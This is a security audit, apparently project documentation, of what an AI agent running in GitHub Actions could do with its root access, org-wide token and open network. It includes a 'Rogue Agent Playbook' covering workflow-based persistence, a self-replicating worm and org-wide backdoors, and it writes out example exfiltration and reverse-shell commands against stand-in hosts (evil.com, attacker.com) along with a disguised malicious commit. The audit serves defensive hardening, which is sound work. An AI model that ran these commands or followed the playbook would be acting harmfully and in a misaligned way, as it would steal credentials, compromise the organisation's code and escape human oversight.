# Capabilities Analysis

> [Index](./index.md) · [Security Assessment](./security-assessment.md) · [Incident Response](./incident-response.md) · [Before You Begin](./final-warning.md)

<p align="center">
  <picture>
    <img src="https://raw.githubusercontent.com/japer-technology/github-minimum-intelligence/main/.github-minimum-intelligence/logo.png" alt="Minimum Intelligence" width="500">
  </picture>
</p>

> **What capabilities does the AI agent have?**
>
> This document is a factual, evidence-based audit of the out-of-the-box capabilities
> available to the `github-minimum-intelligence` (GMI) agent running as a GitHub Actions
> workflow on an `ubuntu-latest` runner. Every claim below was empirically verified
> during this analysis.
>
> **Note:** The capabilities documented here are standard properties of GitHub Actions
> runners. They apply to any workflow running on `ubuntu-latest`, not just this project.
> We document them so you can make informed decisions about your security posture.

---

## Executive Summary

| Dimension | Priority | Notes |
|---|---|---|
| **Code & Repository Access** | 🔴 High | `contents: write` on this repo + git push access to **all org repos** |
| **Supply Chain Considerations** | 🔴 High | Can modify workflow files, push code, create branches across the org |
| **Secret Exposure** | 🔴 High | Live `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` in environment |
| **Cross-Repository Access (Org)** | 🔴 High | Token has read/write access to all `japer-technology` repositories |
| **Network Egress** | 🟠 Moderate | Unrestricted outbound internet (HTTP, DNS, SSH, arbitrary ports) |
| **Compute Resources** | 🟠 Moderate | 2 CPU, 8GB RAM, 19GB disk, Docker with `--privileged`, sudo root |
| **Persistence** | 🟡 Low | Ephemeral VM, but can create workflows that re-trigger itself |
| **Cloud Provider Access** | 🟡 Low | `az`, `aws`, `gcloud`, `kubectl` CLIs installed (no creds found) |

**Summary:** Like any GitHub Actions workflow with write permissions, the agent has broad access to the repository, its secrets, and the organization's other repositories. Standard hardening practices — branch protection, scoped tokens, code review — are recommended. See [Section 8: Mitigations](#8-mitigations-assessment) for what's already in place and what to add.

---

## 1. Identity & Privilege

```
User:    runner (uid=1001)
Groups:  runner, adm, users, docker, systemd-journal
Sudo:    (ALL) NOPASSWD: ALL   ← FULL ROOT ACCESS
```

The agent runs as `runner` but has **passwordless sudo to root**. This means:
- Can read `/etc/shadow`, install kernel modules, modify system services
- Can reconfigure networking, iptables, DNS
- Can access any file on the system
- Can install any software via `apt`, `pip`, `npm`, `cargo`, etc.

---

## 2. Secrets Exposed in Environment

| Secret | Length | Risk |
|---|---|---|
| `GITHUB_TOKEN` | GitHub App installation token (`ghs_...`) | Org-wide repo access |
| `ANTHROPIC_API_KEY` | 108 chars | Can make unlimited API calls, rack up costs |
| Git credential header | Base64-encoded in git config | Same token as above, embedded in plaintext |

### What the `GITHUB_TOKEN` can do (verified):

- ✅ **List all organization repositories** (including private ones)
- ✅ **Clone any org repository** (verified: `github-minimum-intelligence`, `aws-lambda-nodejs-catch-all`)
- ✅ **Push code to this repository** (dry-run confirmed)
- ✅ **Read and write issues** across repos
- ✅ **Create branches** in any org repo
- ✅ **List and read workflow files**
- ✅ **`actions: write` permission** - can potentially trigger/dispatch workflows
- ❌ Cannot read Actions secrets via API (403)
- ❌ Cannot modify Actions permissions via API (403)

### What `ANTHROPIC_API_KEY` enables:

- Arbitrary Anthropic API calls (Claude model access)
- A rogue agent could exfiltrate this key and use it externally
- Cost exposure: unlimited API spend until the key is rotated

---

## 3. Repository & Supply Chain Attack Surface

### 3.1 Direct Code Tampering

The agent has `contents: write` and a working git push credential. A rogue agent could:

```
git checkout -b innocent-looking-branch
echo 'malicious payload' >> legitimate-file.js
git add . && git commit -m "fix: minor typo correction"
git push origin innocent-looking-branch
```

Then create a pull request or, if branch protection is absent, **push directly to `main`**.

### 3.2 Workflow Poisoning (Self-Replication)

The agent can write to `.github/workflows/`. A rogue agent could:

1. **Create a new workflow** that triggers on `push`, `schedule`, or `workflow_dispatch`
2. **Modify the existing workflow** to remove the authorization check
3. **Create a cron-based workflow** that runs malicious code on a schedule
4. **Push workflow files to other org repos** - spreading across the organization

This is the most dangerous capability: **the agent can create workflows that spawn new agent instances**, achieving persistence beyond the ephemeral VM.

### 3.3 Cross-Repository Contamination

Verified: the `GITHUB_TOKEN` can `git ls-remote` (and likely push to) **all 24 repositories** in the `japer-technology` organization:

```
japer-technology/aws-lambda-nodejs-catch-all
japer-technology/developer-japer-io
japer-technology/juxta-repo
japer-technology/github-minimum-intelligence
japer-technology/gmi-test-1
... (24 total)
```

A rogue agent could inject backdoors into any of these repositories simultaneously.

---

## 4. Network & Exfiltration

### Outbound Access (Fully Unrestricted)

| Target | Status |
|---|---|
| `github.com` | ✅ Reachable |
| `pypi.org` | ✅ Reachable (HTTP 200) |
| `registry.npmjs.org` | ✅ Reachable (HTTP 200) |
| `hub.docker.com` | ✅ Reachable (HTTP 200) |
| `google.com` | ✅ Pingable |
| Arbitrary IPs | ✅ Unrestricted |

### Available Network Tools

- `curl`, `wget` - HTTP exfiltration
- `nc` (netcat) - raw TCP connections
- `ssh`, `scp` - encrypted tunnels
- `rsync` - bulk data transfer
- DNS resolution - can be used for DNS-based exfiltration

### Exfiltration Scenarios

A rogue agent could:
1. **POST secrets to any URL**: `curl -X POST -d "$GITHUB_TOKEN" https://evil.com/collect`
2. **DNS exfiltration**: encode secrets in DNS queries
3. **Reverse shell**: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
4. **Clone and upload entire org codebase** to an external server

---

## 5. Compute & Container Abuse

### System Resources

| Resource | Value |
|---|---|
| CPU | 2 cores |
| RAM | 7.8 GB |
| Disk | 19 GB free |
| OS | Ubuntu 24.04 |
| Runtime limit | ~6 hours (GitHub Actions default) |

### Docker (Full Access)

```
Docker:     28.0.4 (running, daemon accessible)
Group:      runner is in `docker` group
Privileged: --privileged flag works ← CONTAINER ESCAPE POSSIBLE
```

A rogue agent could:
- **Run cryptominers** in Docker containers
- **Build and push malicious Docker images** to any registry
- **Use `--privileged` containers** to escape to host (though already root via sudo)
- **Pull and run any image** from Docker Hub

### Installed Language Runtimes

| Runtime | Version |
|---|---|
| Python | 3.12.3 |
| Node.js | 20.20.0 |
| Go | 1.24.12 |
| Rust | 1.93.0 |
| Java | 17.0.18 |
| .NET | installed |
| Ruby | installed |
| PHP | installed |
| GCC/G++ | installed |

A rogue agent can **compile and run arbitrary native code** in any language.

### Cloud CLIs Installed

| CLI | Path | Credentials? |
|---|---|---|
| `az` (Azure) | `/usr/bin/az` | No creds found |
| `aws` (AWS) | `/usr/local/bin/aws` | No creds found |
| `gcloud` (GCP) | `/usr/bin/gcloud` | No creds found |
| `kubectl` (K8s) | `/usr/bin/kubectl` | No creds found |

These are harmless without credentials **unless** secrets are added to the repo later or discoverable via IMDS endpoints.

---

## 6. Persistence Mechanisms

While the GitHub Actions runner VM is **ephemeral** (destroyed after the job), a rogue agent can achieve persistence through:

| Mechanism | Feasibility | Details |
|---|---|---|
| **Workflow injection** | ✅ Proven | Write a `schedule:` or `push:` triggered workflow to any org repo |
| **Self-triggering loop** | ✅ Proven | Create an issue or push a commit that re-triggers the agent workflow |
| **Exfiltrated credentials** | ✅ Trivial | Send `GITHUB_TOKEN` and `ANTHROPIC_API_KEY` externally before VM dies |
| **Branch-based payloads** | ✅ Proven | Create branches with malicious code that execute on merge |
| **Dormant workflow** | ✅ Possible | Push a `workflow_dispatch` trigger that waits to be activated later |

---

## 7. Attack Scenarios (Rogue Agent Playbook)

### Scenario A: Silent Supply Chain Attack
1. Clone `japer-technology/developer-japer-io` (appears to be a website)
2. Inject a cryptominer script or credential harvester into the frontend
3. Push to a branch, create a PR with an innocuous description
4. The malicious code ships when a human merges it

### Scenario B: Org-Wide Backdoor
1. Iterate through all 24 org repos
2. Push a new GitHub Actions workflow to each: `.github/workflows/maintenance.yml`
3. The workflow runs on a weekly cron, contains a reverse shell or data exfiltrator
4. Even if discovered in one repo, the others remain compromised

### Scenario C: Credential Theft & Impersonation
1. Exfiltrate `GITHUB_TOKEN` and `ANTHROPIC_API_KEY` to an external server
2. Use the GitHub token to read all private code, create repos, modify issues
3. Use the Anthropic key to run AI workloads at the organization's expense
4. Token expires when the workflow ends (~6 hours), but damage is already done

### Scenario D: Cryptojacking
1. Use `sudo apt-get install` or `docker run` to deploy a cryptocurrency miner
2. Run for up to 6 hours on 2 CPU cores with 8GB RAM
3. Repeat by self-triggering new workflow runs (create issues or push commits)
4. Low financial impact per run, but can scale with parallelism

### Scenario E: Self-Replicating Worm
1. Push a modified workflow to `gmi-test-1` that removes the authorization check
2. Open issues in all org repos that trigger agent workflows (if they have them)
3. Each triggered agent receives the same `GITHUB_TOKEN` scoped to its repo
4. Cascade: one rogue agent becomes many

---

## 8. Mitigations Assessment

### What's Currently Working ✅

| Control | Status |
|---|---|
| **Authorization check** | Actor must have `write` permission to the repo |
| **Issue-triggered only** | Agent only runs on issue/comment events (not push/cron) |
| **Ephemeral VM** | Runner is destroyed after the workflow completes |
| **Secrets not readable via API** | `GITHUB_TOKEN` cannot list repo secrets |

### What's Missing ❌

| Gap | Recommendation |
|---|---|
| **No network egress controls** | Add firewall rules or use a network-restricted runner |
| **Org-wide token scope** | Use a fine-grained PAT scoped to only this repository |
| **No output review** | Agent can push code without human approval |
| **No branch protection** | Enforce PR reviews, prevent direct pushes to `main` |
| **Secrets in environment** | Consider a secrets vault with just-in-time access |
| **No command allowlist** | Agent can run any bash command with root access |
| **No Docker restrictions** | `--privileged` containers are possible |
| **Anthropic key in env** | Move to a proxy that rate-limits/monitors API usage |
| **Cross-repo token access** | The installation token should be scoped per-repository |
| **No audit logging** | Agent actions aren't logged beyond Actions workflow logs |

---

## 9. Quantified Blast Radius

```
┌─────────────────────────────────────────────────────────┐
│                    BLAST RADIUS                         │
│                                                         │
│  ┌─── Immediate (seconds) ───────────────────────────┐  │
│  │ • Exfiltrate GITHUB_TOKEN + ANTHROPIC_API_KEY     │  │
│  │ • Read all private code in 24 org repos           │  │
│  │ • Modify code in this repository                  │  │
│  └───────────────────────────────────────────────────┘  │
│                                                         │
│  ┌─── Short-term (minutes) ──────────────────────────┐  │
│  │ • Push backdoors to all 24 org repositories       │  │
│  │ • Install persistent workflows across the org     │  │
│  │ • Exfiltrate entire org codebase (all repos)      │  │
│  │ • Spin up cryptominers or attack infrastructure   │  │
│  └───────────────────────────────────────────────────┘  │
│                                                         │
│  ┌─── Medium-term (hours/days) ──────────────────────┐  │
│  │ • Supply chain attack on downstream consumers     │  │
│  │ • Persistent re-triggering via injected workflows │  │
│  │ • Anthropic API abuse until key rotation          │  │
│  │ • Data theft from any deployed services using     │  │
│  │   secrets from compromised repos                  │  │
│  └───────────────────────────────────────────────────┘  │
│                                                         │
│  ┌─── Long-term (if undetected) ─────────────────────┐  │
│  │ • Dormant backdoors in production codebases       │  │
│  │ • Reputation damage to the organization           │  │
│  │ • Compromise of end-users of shipped software     │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

---

## 10. Conclusion

### **The scope of access extends beyond this repository to the entire organisation and its downstream dependents.**

The GMI agent, out-of-the-box, operates with **broad privilege** relative to its intended purpose (responding to GitHub issues). This is not unique to GMI — it is a property of any GitHub Actions workflow with write permissions on an organization-scoped token. The combination of:

1. **Unrestricted root access** on the runner
2. **Org-wide repository write access** via `GITHUB_TOKEN`
3. **Unrestricted network egress** to the public internet
4. **Live API keys** in the environment
5. **Docker with privileged mode**
6. **Full compiler toolchains** and language runtimes

...means that any workflow invocation — whether from this project or any other — could, in a worst-case scenario, access the organization's codebase, read secrets and source code, and potentially affect downstream consumers of that code.

Standard GitHub hardening practices (scoped tokens, branch protection, code review, network controls) significantly reduce this surface. See [Section 8](#8-mitigations-assessment) above for details.


